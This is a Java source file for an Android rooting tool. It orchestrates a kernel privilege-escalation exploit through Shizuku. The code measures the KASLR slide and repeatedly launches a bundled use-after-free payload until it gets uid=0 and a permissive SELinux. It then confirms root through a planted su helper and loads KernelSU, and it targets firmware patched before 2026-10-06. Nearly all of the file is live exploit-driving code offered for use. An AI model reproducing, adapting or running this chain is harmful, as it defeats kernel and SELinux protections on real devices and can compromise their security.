package com.gkeyes.lhasa26.core;

import android.content.res.AssetManager;

import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Owns the long-running workflow. UI code only receives immutable events and never runs shell work.
 * The supplied native payloads remain opaque assets; orchestration and state handling are our code.
 */
public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
    public enum State { IDLE, RUNNING, ROOTED, KSU_PENDING, COMPLETE, FAILED }

    public static final String[] STEP_LABELS = {
            "校验内核", "等待系统空闲", "部署程序", "测量内核地址",
            "提权执行", "结果验证", "KernelSU 接管"
    };

    private static final Pattern RUNNING_PAYLOAD = Pattern.compile("uaf_plant_replay");
    private static final String RUN_MARKER = "/data/local/tmp/.lhasa_run";
    private static final String FAILED_MARKER = "/data/local/tmp/.lhasa_failed_boot";
    private final CommandExecutor executor;
    private final AssetDeployer deployer;
    private final WorkflowCallbacks callbacks;
    private final ExecutorService worker = Executors.newSingleThreadExecutor(r -> {
        Thread thread = new Thread(r, "lhasa-workflow");
        thread.setDaemon(true);
        return thread;
    });
    private final Object logLock = new Object();
    private final StringBuilder sessionLog = new StringBuilder();
    private volatile State state = State.IDLE;
    private volatile long startedAt;
    private volatile int currentStep = -1;
    private volatile boolean busy;
    private volatile boolean rootBeforeRun;
    private volatile String enforceBeforeRun = "";
    private volatile long lastDeviceRefresh;

    public WorkflowEngine(AssetManager assets, CommandExecutor executor, WorkflowCallbacks callbacks) {
        this.executor = executor;
        this.callbacks = callbacks;
        this.deployer = new AssetDeployer(assets, executor, this);
    }

    public State getState() {
        return state;
    }

    public boolean startRoot() {
        return start("root", this::runRootChain, true);
    }

    public boolean retryKernelSu() {
        if (state != State.ROOTED && state != State.KSU_PENDING) {
            return false;
        }
        return start("ksu", this::runKernelSuStep, true);
    }

    public boolean diagnose() {
        return start("diagnose", this::runDiagnosis, false);
    }

    public void refreshDeviceInfo() {
        worker.execute(() -> {
            if (!executor.isAvailable()) {
                return;
            }
            try {
                long now = System.currentTimeMillis();
                if (now - lastDeviceRefresh < 5000L) {
                    return;
                }
                lastDeviceRefresh = now;
                String[] fields = run("getprop ro.product.device; getprop ro.build.version.incremental; uname -r", true)
                        .output.trim().split("\\n");
                DeviceSnapshot snapshot = new DeviceSnapshot(
                        fields.length > 0 ? fields[0] : "",
                        fields.length > 1 ? fields[1] : "",
                        fields.length > 2 ? fields[2] : "");
                callbacks.onDevice(snapshot);
            } catch (Exception ignored) {
                // Device information is supplemental and should never block the main action.
            }
        });
    }

    public void stop() {
        worker.shutdownNow();
        executor.kill();
    }

    public String getSessionLog() {
        synchronized (logLock) {
            return sessionLog.toString();
        }
    }

    @Override
    public void append(String line) {
        if (line == null || line.trim().isEmpty()) {
            return;
        }
        String value = line.endsWith("\n") ? line : line + "\n";
        synchronized (logLock) {
            sessionLog.append(value);
            if (sessionLog.length() > 96000) {
                sessionLog.delete(0, sessionLog.length() - 64000);
            }
        }
        callbacks.onLog(value);
    }

    @FunctionalInterface
    private interface WorkflowTask {
        void run() throws Exception;
    }

    /**
     * Serializes every background operation behind one busy flag. Diagnosis runs with ownsState=false
     * so it never rewrites the root workflow state nor wipes the session log of a finished run.
     */
    private boolean start(String operation, WorkflowTask action, boolean ownsState) {
        synchronized (this) {
            if (busy) {
                append("正在运行，请勿重复点击。");
                return false;
            }
            if (!executor.isAvailable()) {
                callbacks.onStatus("Shizuku 未运行或尚未授权");
                append("请先启动 Shizuku 并授权本应用。");
                return false;
            }
            busy = true;
            startedAt = System.currentTimeMillis();
            currentStep = -1;
            if (ownsState) {
                state = State.RUNNING;
                synchronized (logLock) {
                    sessionLog.setLength(0);
                }
                callbacks.onState(State.RUNNING, operation);
            } else {
                callbacks.onStatus("正在诊断");
            }
        }
        worker.execute(() -> {
            try {
                action.run();
            } catch (InterruptedException interrupted) {
                Thread.currentThread().interrupt();
                if (ownsState) {
                    fail("操作已中断");
                } else {
                    append("操作已中断");
                }
            } catch (Throwable failure) {
                append(friendly(failure));
                if (ownsState) {
                    fail(friendly(failure));
                } else {
                    callbacks.onStatus("诊断失败 · " + friendly(failure));
                }
            } finally {
                busy = false;
            }
        });
        return true;
    }

    private void runRootChain() throws Exception {
        step(0);
        status("核对内核");
        String kernel = run("uname -r", false).output.trim();
        append("uname -r = " + kernel);
        if (!KernelSupport.isSupported(kernel)) {
            append("（警告）当前内核不在已验证列表，仍继续，风险自负。");
        }
        if (payloadProcessCount() > 0) {
            throw new IllegalStateException("上次运行的进程仍在运行，请重启设备后重试。");
        }
        String boot = bootId();
        writeRunMarker(boot);
        String failed = run("cat " + FAILED_MARKER + " 2>/dev/null", true).output.trim();
        if (!boot.isEmpty() && !failed.isEmpty()) {
            String[] parts = failed.split("\\s+");
            if (boot.equals(parts[0])) {
                boolean permissive = parts.length > 1 && "0".equals(parts[1]);
                if (!permissive) {
                    throw new IllegalStateException("本次开机已失败且 SELinux 仍为 Enforcing，请重启后重试。");
                }
                append("（提示）本次开机已为 Permissive，将直接重试 cred 阶段。");
            }
        }
        captureBaseline();
        cleanMemory();

        step(1);
        status("等待系统空闲");
        final java.util.concurrent.atomic.AtomicReference<Exception> deployError =
                new java.util.concurrent.atomic.AtomicReference<>();
        Thread deploy = new Thread(() -> {
            try {
                deployer.stageAll();
            } catch (Exception error) {
                deployError.set(error);
            }
        }, "lhasa-deploy");
        deploy.start();
        waitForIdle();
        deploy.join(8000L);
        if (deployError.get() != null) {
            throw deployError.get();
        }

        step(2);
        status("程序已就位");

        step(3);
        status("测量本次开机的内核地址");
        String addressArgument = measureAddress();

        step(4);
        status("提权执行中，请稍候");
        if (!runPayload(addressArgument)) {
            stopPayload();
            recordFailedBoot(boot);
            throw new IllegalStateException("提权失败 · 请重启设备");
        }

        step(5);
        status("验证");
        CommandResult verify = run("/data/local/tmp/pc98260-su -c 'id; getenforce; grep CapEff /proc/self/status'", false);
        append(verify.output);
        if (!isRoot(verify.output)) {
            recordFailedBoot(boot);
            throw new IllegalStateException("rootd 无响应 · 请重启设备");
        }
        run("rm -f " + FAILED_MARKER, true);
        clearRunMarker();
        state = State.ROOTED;
        callbacks.onStatus("已获得临时 ROOT · 正在加载 KernelSU");
        append("临时 ROOT 已就绪。");
        append("[归因] " + (rootBeforeRun
                ? "运行前已具备 uid=0（root 非本次取得），本次只确认根通道可用"
                : "运行前无 uid=0，运行后 uid=0 → 本次提权链路生效")
                + " · SELinux " + (enforceBeforeRun.isEmpty() ? "?" : enforceBeforeRun)
                + " → " + enforceNow());

        runKernelSuStep();
    }

    private void runDiagnosis() throws Exception {
        status("正在诊断");
        deployer.stage("reach_probe");
        CommandResult result = run("/data/local/tmp/reach_probe > /data/local/tmp/diag.log 2>&1", true);
        String report = run("cat /data/local/tmp/diag.log 2>/dev/null", true).output;
        if (report.trim().isEmpty()) {
            report = result.output;
        }
        append(report);
        run("echo '!enable_event:kmem:kmem_cache_alloc' > /sys/kernel/tracing/events/kmem/rss_stat/trigger 2>/dev/null; echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null", true);
        String patch = run("getprop ro.build.version.security_patch", true).output.trim();
        append("[诊断] security_patch=" + patch + (patch.compareTo("2026-10-06") < 0
                ? " · 未修补窗口"
                : " · 可能已回补"));
        if (report.contains("必需项全部通过")) {
            status("诊断通过 · 环境可用");
            append("[诊断] 通过 · 环境可用（仅代表探针达标，不代表固件已修补或未修补）");
        } else {
            status("诊断未通过 · 详见日志");
            append(report.contains("必需接口不可用") ? "[诊断] 失败 · 有必需项未通过" : "[诊断] 未完成 · 详见日志");
        }
    }

    private void runKernelSuStep() {
        try {
            step(6);
            status("已获得临时 ROOT · 正在加载 KernelSU");
            deployer.stage("ksud");
            CommandResult load = run("rm -f /data/local/tmp/ksu_try.log; "
                    + "/data/local/tmp/pc98260-su -c \"cd /data/local/tmp && ./ksud late-load --kmi android17-6.18 --allow-shell --package-name me.weishu.kernelsu\" "
                    + ">> /data/local/tmp/ksu_try.log 2>&1; echo rc=$? >> /data/local/tmp/ksu_try.log; "
                    + "for i in 1 2 3 4 5 6 7 8 9 10; do /system/bin/su -c id >> /data/local/tmp/ksu_try.log 2>&1 && break; sleep 0.3; done", true);
            String log = run("cat /data/local/tmp/ksu_try.log 2>/dev/null", true).output;
            if (log.trim().isEmpty()) {
                log = load.output;
            }
            append(log);
            // The takeover verdict must come from its own probe, never from scanning a merged log:
            // loader output, exit codes and the identity query all land in the same file.
            CommandResult suProbe = run("/system/bin/su -c id 2>/dev/null", true);
            CommandResult ksudProbe = run("/system/bin/su -c '/data/local/tmp/ksud -V' 2>/dev/null", true);
            append("[KSU] su -c id → " + oneLine(suProbe.output));
            append("[KSU] ksud -V → " + oneLine(ksudProbe.output));
            if (suProbe.output.contains("uid=0")) {
                state = State.COMPLETE;
                callbacks.onState(State.COMPLETE, "全部完成 · KernelSU 已接管");
            } else {
                state = State.KSU_PENDING;
                callbacks.onState(State.KSU_PENDING, "KernelSU 未接管 · 临时 ROOT 仍有效，可再次尝试");
            }
        } catch (Throwable failure) {
            append(friendly(failure));
            if (shizukuGone()) {
                state = State.KSU_PENDING;
                callbacks.onState(State.KSU_PENDING,
                        "KernelSU 可能已接管 · Shizuku 已断开，请重新启动 Shizuku 后再确认");
                return;
            }
            if (isPanic()) {
                state = State.FAILED;
                callbacks.onState(State.FAILED, "内核已 panic（pstore 有记录），必须重启后再试");
                return;
            }
            state = State.KSU_PENDING;
            callbacks.onState(State.KSU_PENDING, "KernelSU 未接管 · 临时 ROOT 仍有效，可再次尝试");
        }
    }

    private void waitForIdle() throws Exception {
        long started = System.currentTimeMillis();
        int runnable = -1;
        long freeKb = -1;
        boolean reached = false;
        while (System.currentTimeMillis() - started < 20000L) {
            String[] lines = run("cat /proc/loadavg 2>/dev/null; awk '/MemFree/{print $2}' /proc/meminfo 2>/dev/null", true).output.trim().split("\\n");
            if (lines.length > 0) {
                String[] fields = lines[0].trim().split("\\s+");
                if (fields.length >= 4 && fields[3].contains("/")) {
                    try {
                        runnable = Integer.parseInt(fields[3].substring(0, fields[3].indexOf('/')));
                    } catch (NumberFormatException ignored) {
                        runnable = -1;
                    }
                }
            }
            if (lines.length > 1) {
                try {
                    freeKb = Long.parseLong(lines[1].trim());
                } catch (NumberFormatException ignored) {
                    freeKb = -1;
                }
            }
            if (runnable >= 0 && runnable <= 6 && freeKb >= 200000) {
                reached = true;
                break;
            }
            Thread.sleep(300L);
        }
        append(String.format(Locale.US, "[空闲] 等待 %.1fs · runnable=%d · MemFree=%d kB · %s",
                (System.currentTimeMillis() - started) / 1000.0, runnable, freeKb,
                reached ? "达标，开跑" : "未达标，仍开跑"));
    }

    private String measureAddress() throws Exception {
        for (int seconds : new int[]{1, 2}) {
            CommandResult result = run("/data/local/tmp/perf_slide --duration " + seconds, true);
            String output = filterProbe(result.output);
            if (!output.trim().isEmpty()) {
                append(output);
            }
            String slide = KernelSupport.extractSlide(result.output);
            long parsed = KernelSupport.parseHex(slide);
            if (slide != null && KernelSupport.isSlideValid(parsed)) {
                append("slide = " + slide + "（perf " + seconds + "s）");
                return "--slide " + slide;
            }
            if (slide != null) {
                append("slide " + slide + " 越界/未对齐，弃用");
            }
        }
        append("perf_slide 未取到，改用 slide_probe");
        CommandResult probe = run("/data/local/tmp/slide_probe", false);
        append(filterProbe(probe.output));
        String calc = KernelSupport.extractCalc(probe.output);
        if (calc != null) {
            append("slide = " + calc + "（kprobe）");
            return "--slide " + calc;
        }
        String site = KernelSupport.extractSite(probe.output);
        if (site != null) {
            append("site = " + site + "（trace 扫描）");
            return "--site " + site;
        }
        throw new IllegalStateException("未能读取 KASLR 偏移，请确认 perf / tracefs 可用。");
    }

    private boolean runPayload(String addressArgument) throws Exception {
        for (int attempt = 1; attempt <= 3; attempt++) {
            run("rm -f /data/local/tmp/uaf_replay.log; toybox setsid sh -c '/data/local/tmp/uaf_plant_replay "
                    + addressArgument + " > /data/local/tmp/uaf_replay.log 2>&1 < /dev/null' >/dev/null 2>&1 & echo STARTED", true);
            Thread.sleep(1500L);
            for (int poll = 0; poll < 200; poll++) {
                String tail = run("tail -n 24 /data/local/tmp/uaf_replay.log 2>/dev/null", true).output;
                if (!tail.trim().isEmpty()) {
                    callbacks.onTail(tail);
                }
                if (containsSuccessMarker(tail)) {
                    return true;
                }
                if (poll % 5 == 4) {
                    CommandResult verify = run("/data/local/tmp/pc98260-su -c 'id'", true);
                    if (isRoot(verify.output)) {
                        return true;
                    }
                }
                if (containsRetryMarker(tail)) {
                    break;
                }
                Thread.sleep(800L);
            }
            if (attempt < 3) {
                append("[重试] 第 " + attempt + " 次未命中，重启 payload 再试（" + (attempt + 1) + "/3）");
                stopPayload();
                Thread.sleep(1200L);
            }
        }
        return isRoot(run("/data/local/tmp/pc98260-su -c 'id'", true).output);
    }

    private boolean containsSuccessMarker(String tail) {
        return tail.contains("[child-cred] uid=0")
                || tail.contains("[cred] rooted")
                || tail.contains("holding pages")
                || tail.contains("[selinux] already permissive");
    }

    private boolean containsRetryMarker(String tail) {
        return tail.contains("holding zombie")
                || tail.contains("leak failed")
                || tail.contains("[selinux] attempt 2/");
    }

    private void stopPayload() throws Exception {
        run("pkill -f uaf_plant_replay 2>/dev/null; killall uaf_plant_replay 2>/dev/null; true", true);
    }

    private int payloadProcessCount() throws Exception {
        String output = run("ps -A 2>/dev/null | grep -c '[u]af_plant_replay'", true).output.trim();
        try {
            return Integer.parseInt(output);
        } catch (NumberFormatException ignored) {
            Matcher matcher = RUNNING_PAYLOAD.matcher(output);
            return matcher.find() ? 1 : 0;
        }
    }

    /** Runs a maintenance command through the same busy gate as the exploit workflow. */
    public boolean runMaintenance(String command) {
        return start("maint", () -> {
            CommandResult result = run(command, true);
            append(result.isSuccess() ? "维护命令完成" : "维护命令失败：" + result.output);
        }, false);
    }

    private CommandResult run(String command, boolean quiet) throws Exception {
        return executor.run(command, quiet);
    }

    /** Boot id of the running kernel; empty when the value cannot be read. */
    private String bootId() {
        try {
            return run("cat /proc/sys/kernel/random/boot_id 2>/dev/null", true).output.trim();
        } catch (Exception ignored) {
            return "";
        }
    }

    private void writeRunMarker(String boot) {
        if (boot == null || boot.isEmpty()) {
            return;
        }
        try {
            run("echo '" + boot + " " + System.currentTimeMillis() + "' > " + RUN_MARKER, true);
        } catch (Exception ignored) {
            // A missing marker only degrades diagnostics.
        }
    }

    private void clearRunMarker() {
        try {
            run("rm -f " + RUN_MARKER, true);
        } catch (Exception ignored) {
            // Best effort only.
        }
    }

    /**
     * Records the failed boot so a second attempt inside the same boot can be gated exactly like the
     * original tool: SELinux already permissive means the first phase landed, so only the cred stage
     * has to be retried; still Enforcing means the kernel state is polluted and a reboot is required.
     */
    private void recordFailedBoot(String boot) {
        if (boot == null || boot.isEmpty()) {
            return;
        }
        try {
            boolean permissive = "Permissive".equalsIgnoreCase(run("getenforce 2>/dev/null", true).output.trim());
            run("echo '" + boot + " " + (permissive ? 0 : 1) + "' > " + FAILED_MARKER, true);
            append(permissive
                    ? "已记录本次失败：SELinux 已 Permissive，可直接重试 cred 阶段（无需重启）。"
                    : "已记录本次失败：SELinux 仍 Enforcing，请重启后重试，切勿重复点击。");
        } catch (Exception ignored) {
            // Recording the failure must never mask the original error.
        }
    }

    /** Frees memory before the exploit runs; the payload needs large contiguous allocations. */
    private void cleanMemory() {
        try {
            long before = memFreeKb();
            CommandResult stop = run("am force-stop com.tencent.mm 2>/dev/null; am force-stop com.tencent.mobileqq 2>/dev/null; true", true);
            long after = memFreeKb();
            append("清理系统内存：MemFree " + before + " kB → " + after + " kB"
                    + (stop.exitCode == 0 ? "" : "（命令退出码 " + stop.exitCode + "）"));
        } catch (Exception ignored) {
            append("清理系统内存：跳过");
        }
    }

    private long memFreeKb() {
        try {
            String out = run("awk '/MemFree/{print $2}' /proc/meminfo 2>/dev/null", true).output.trim();
            return Long.parseLong(out);
        } catch (Exception ignored) {
            return -1L;
        }
    }

    /**
     * Records what the device already looked like before any exploit step, so a later "uid=0" can be
     * attributed: pre-existing root, patch level of the running firmware, and a live rootd socket.
     */
    private void captureBaseline() {
        try {
            String id = oneLine(run("id 2>/dev/null", true).output);
            enforceBeforeRun = run("getenforce 2>/dev/null", true).output.trim();
            String patch = run("getprop ro.build.version.security_patch", true).output.trim();
            String suProbe = run("/system/bin/su -c id 2>/dev/null", true).output;
            String socket = run("ls -l /data/local/tmp/pc98260-root.sock 2>/dev/null", true).output.trim();
            append("[基线] id=" + id + " · SELinux=" + enforceBeforeRun);
            append("[基线] security_patch=" + patch + (patch.compareTo("2026-10-06") < 0
                    ? "（早于上游修复 2026-10-06，处于未修补窗口）"
                    : "（不早于上游修复 2026-10-06，固件可能已回补，失败需先怀疑此处）"));
            append("[基线] /system/bin/su=" + (suProbe.trim().isEmpty() ? "无" : oneLine(suProbe)));
            append("[基线] rootd socket=" + (socket.isEmpty() ? "无" : "已存在（本次开机可能已 root 过）"));
            rootBeforeRun = suProbe.contains("uid=0") || id.contains("uid=0");
        } catch (Exception ignored) {
            // A missing baseline only weakens attribution, it must not stop the run.
        }
    }

    private String enforceNow() {
        try {
            return run("getenforce 2>/dev/null", true).output.trim();
        } catch (Exception ignored) {
            return "?";
        }
    }

    private static String oneLine(String value) {
        if (value == null) {
            return "";
        }
        String trimmed = value.trim();
        return trimmed.isEmpty() ? "无" : trimmed.replace('\n', ' ');
    }

    private boolean shizukuGone() {
        try {
            return !executor.isAvailable();
        } catch (Throwable ignored) {
            return true;
        }
    }

    private boolean isPanic() {
        try {
            String out = run("grep -m1 -aE 'Kernel panic|Internal error|Unable to handle kernel|BUG: ' "
                    + "/sys/fs/pstore/console-ramoops* 2>/dev/null", true).output;
            return out != null && !out.trim().isEmpty();
        } catch (Exception ignored) {
            return false;
        }
    }

    private void step(int value) {
        currentStep = value;
        callbacks.onStep(value, value >= 0 && value < STEP_LABELS.length ? STEP_LABELS[value] : "全部完成");
    }

    private void status(String text) {
        callbacks.onStatus(text);
    }

    private void fail(String message) {
        state = State.FAILED;
        callbacks.onState(State.FAILED, message);
    }

    private static boolean isRoot(String output) {
        return output != null && (output.contains("uid=0(root)") || output.contains("uid=0 "));
    }

    private static String filterProbe(String output) {
        if (output == null) {
            return "";
        }
        StringBuilder filtered = new StringBuilder();
        for (String line : output.split("\\n")) {
            if (!line.startsWith("[slide] cpu") && !line.trim().isEmpty()) {
                filtered.append(line).append('\n');
            }
        }
        return filtered.toString();
    }

    private static String friendly(Throwable error) {
        Throwable current = error;
        while (current.getCause() != null) {
            current = current.getCause();
        }
        String message = current.getMessage();
        if (message == null || message.trim().isEmpty()) {
            message = current.toString();
        }
        if (message.contains("DeadObject") || message.contains("Binder") || message.contains("binder")) {
            return "Shizuku 连接已断开，请重新启动 Shizuku";
        }
        return message;
    }
}
